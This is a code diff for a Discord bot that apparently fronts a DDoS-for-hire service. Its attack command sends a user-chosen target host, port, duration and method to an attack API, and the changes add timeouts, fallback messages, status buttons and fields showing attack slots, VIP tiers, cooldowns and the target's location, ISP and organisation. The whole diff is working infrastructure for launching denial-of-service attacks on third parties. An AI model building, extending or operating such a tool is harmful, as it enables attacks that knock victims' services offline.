+      const profileResponse = await apiFetch(`/api/discord_profile?discord_user_id=${encodeURIComponent(discordUserId)}`, { signal: profileController.signal });
+      profilePayload = await profileResponse.json();
+      console.log('Profile payload received', { ok: !profilePayload.error });
+    } catch (err) {
+      clearTimeout(profileTimeout);
+      console.error('Profile fetch failed or timed out:', err?.message || err);
+      try { await interaction.editReply({ content: 'Failed to verify profile: API request timed out or failed.' }); } catch (e) {}
+      return;
+    }
+    clearTimeout(profileTimeout);
     if (profilePayload.error) {
-      await interaction.reply({ content: profilePayload.message || 'You must link your Discord account before launching an attack. Use /link first.', ephemeral: true });
+      await interaction.editReply({ content: profilePayload.message || 'You must link your Discord account before launching an attack. Use /link first.' });
       return;
     }
 
     const profile = profilePayload.data.profile;
     if (!profile.api_access) {
-      await interaction.reply({ content: 'Your account does not have API access enabled.', ephemeral: true });
+      await interaction.editReply({ content: 'Your account does not have API access enabled.' });
       return;
     }
 
     const username = profile.username;
-    const response = await fetch(`${apiBaseUrl}/api/attack?username=${encodeURIComponent(username)}&host=${encodeURIComponent(host)}&port=${encodeURIComponent(port)}&time=${encodeURIComponent(time)}&method=${encodeURIComponent(method)}`);
-    const payload = await response.json();
+    const password = profile.password || '';
+    // Timeout the attack request after 15s to avoid long 'thinking' states
+    const attackController = new AbortController();
+    const attackTimeout = setTimeout(() => attackController.abort(), 15000);
+    let payload;
+    try {
+      console.log('Sending attack request to API for', username);
+      const url = `/api/attack?discord_user_id=${encodeURIComponent(discordUserId)}&host=${encodeURIComponent(host)}&port=${encodeURIComponent(port)}&time=${encodeURIComponent(time)}&method=${encodeURIComponent(method)}`;
+      const botKey = process.env.BOT_API_KEY;
+      if (!botKey) {
+        await interaction.editReply({ content: 'Server misconfigured: BOT_API_KEY is not set. Please contact the server administrator to configure the bot.' });
+        return;
+      }
+      const headers = { Authorization: `Bearer ${botKey}` };
+      const response = await apiFetch(url, { signal: attackController.signal, headers });
+      payload = await response.json();
+      console.log('Attack API response received', { error: Boolean(payload?.error), payload });
+    } catch (err) {
+      clearTimeout(attackTimeout);
+      console.error('Attack request failed or timed out:', err?.message || err);
+      try { await interaction.editReply({ content: 'Attack request failed or timed out. Please try again later.' }); } catch (e) {}
+      return;
+    }
+    clearTimeout(attackTimeout);
     if (payload.error) {
       const hint = payload.hint ? ` ${payload.hint}` : '';
-      await interaction.reply({ content: `Attack failed: ${payload.message || 'unknown error'}.${hint}`, ephemeral: true });
+      await interaction.editReply({ content: `Attack failed: ${payload.message || 'unknown error'}.${hint}` });
       return;
     }
 
@@ -547,22 +1029,74 @@ client.on('interactionCreate', async (interaction) => {
       durationSeconds,
       startTime: Date.now(),
       maxConcurrents: profile.max_concurrents ?? 'N/A',
-      apiSlots: attackDetails.Global_API_Slots ?? 'N/A'
+      apiSlots: attackDetails.Global_API_Slots ?? 'N/A',
+      vip: Boolean(attackDetails.Vip_Status || attackDetails.Vip || profile.vip),
+      holder: Boolean(attackDetails.Holder_Status || attackDetails.Holder || profile.holder),
+      admin: Boolean(attackDetails.Admin_Status || attackDetails.Admin || profile.admin),
+      attacksRemaining: Number(attackDetails.Attacks_Remaining || 0),
+      methodMaxSlots: Number(attackDetails.Method_Max_Slots || 0),
+      methodActiveSlots: Number(attackDetails.Method_Active_Slots || 0),
+      cooldown: Number(attackDetails.Cooldown || attackDetails.cooldown || attackDetails.cooldown_seconds || attackDetails.CooldownSeconds || 0),
+      targetCountry: attackDetails.target_country || attackDetails.target_country_code || null,
+      targetCity: attackDetails.target_city || null,
+      targetOrg: attackDetails.target_org || attackDetails.targetOrg || attackDetails.organisation || attackDetails.org || attackDetails.Organization || attackDetails.Organization_Name || attackDetails.ORG || attackDetails.Org || attackDetails.provider || null,
+      targetIsp: attackDetails.target_isp || attackDetails.targetIsp || null,
+      owner: profile.username || null,
+      discordUserId: discordUserId,
+      ownerAvatar: interaction.user?.displayAvatarURL ? interaction.user.displayAvatarURL({ extension: 'png', size: 256 }) : null,
+      attackId: attackDetails.attack_id || attackDetails.id || attackDetails.attackID || attackDetails.attackId || attackDetails.request_id || attackDetails.requestId || attackDetails.uuid || attackDetails.hash || null,
+      id: attackDetails.attack_id || attackDetails.id || attackDetails.attackID || attackDetails.attackId || attackDetails.request_id || attackDetails.requestId || attackDetails.uuid || attackDetails.hash || null,
+      localId: (attackDetails.attack_id || attackDetails.id || attackDetails.attackID || attackDetails.attackId || attackDetails.request_id || attackDetails.requestId || attackDetails.uuid || attackDetails.hash) ? null : `tmp-${Math.floor(Date.now()/1000).toString(36)}`
     };
 
-    const container = buildAttackContainer(attackState);
-    const reply = await interaction.reply({
-      components: [container],
-      flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral
-    });
-    if (reply?.id) {
-      attackMessageState.set(reply.id, attackState);
+    let container = buildAttackContainer(attackState);
+    let serializationFailed = false;
+    try {
+      console.log('Attack container JSON:', JSON.stringify(container.toJSON()));
+    } catch (e) {
+      serializationFailed = true;
+      console.error('Failed to serialize attack container (will use minimal fallback):', e);
+    }
+
+      if (serializationFailed) {
+        // Build a minimal container fallback to ensure we can send Components V2
+        const minimal = new ContainerBuilder()
+          .setAccentColor(0x95A5A6)
+          .addTextDisplayComponents(new TextDisplayBuilder().setContent(`## ⚔️ Attack • ${attackState.targetLabel || host}`))
+          .addTextDisplayComponents(new TextDisplayBuilder().setContent(`**Method:** ${attackState.methodLabel || method} • **Time:** ${attackState.durationSeconds || time}s`));
+        const actions = new ActionRowBuilder();
+        if (attackState.attackId) actions.addComponents(new ButtonBuilder().setStyle(ButtonStyle.Link).setLabel('View (API)').setURL(`${API_CANDIDATES[0].replace(/\/$/, '')}/api/attack_status?id=${encodeURIComponent(attackState.attackId)}`));
+        actions.addComponents(new ButtonBuilder().setStyle(ButtonStyle.Secondary).setLabel('Refresh').setCustomId('attack_refresh'));
+        const stopBtn = new ButtonBuilder().setStyle(ButtonStyle.Danger).setLabel('Stop').setCustomId(`attack_stop:${attackState.attackId || ''}`).setEmoji({ name: '👻' });
+        actions.addComponents(stopBtn);
+        minimal.addActionRowComponents(actions);
+        container = minimal;
+      }
+
+    try {
+      const sent = await interaction.editReply({ components: [container], flags: MessageFlags.IsComponentsV2 });
+      console.log('Edited reply with attack container', { messageId: sent?.id });
+      if (sent?.id) attackMessageState.set(sent.id, { ...attackState, channelId: sent.channelId, messageId: sent.id });
+    } catch (err) {
+      console.error('Failed to editReply for attack (final):', err?.message || err, err);
+      // Fallback: send a minimal components V2 follow-up to avoid plain text
+      try {
+        const minimalFollow = new ContainerBuilder()
+          .setAccentColor(0x95A5A6)
+          .addTextDisplayComponents(new TextDisplayBuilder().setContent(`Attack accepted: ${attackState.targetLabel || host} • ${attackState.methodLabel || method} • ${attackState.durationSeconds || time}s`))
+          .addActionRowComponents(new ActionRowBuilder().addComponents(new ButtonBuilder().setStyle(ButtonStyle.Secondary).setLabel('Refresh').setCustomId('attack_refresh')));
+        await interaction.followUp({ components: [minimalFollow], flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral });
+      } catch (e) {
+        console.error('Failed fallback followUp (components):', e);
+        // Last resort: plain text follow-up
+        try { await interaction.followUp({ content: `Attack accepted: ${attackState.targetLabel || host}:${port} • ${attackState.methodLabel || method} • ${attackState.durationSeconds || time}s`, ephemeral: true }); } catch (e) { console.error('Failed final text followUp:', e); }
+      }
     }
     return;
   }
 
   if (interaction.commandName === 'unlink') {
-    const response = await fetch(`${apiBaseUrl}/api/unlink?discord_user_id=${encodeURIComponent(discordUserId)}`);
+    const response = await apiFetch(`/api/unlink?discord_user_id=${encodeURIComponent(discordUserId)}`);
     const payload = await response.json();
     if (payload.error) {
       await interaction.reply({ content: payload.message || 'Unable to unlink your Discord account.', ephemeral: true });
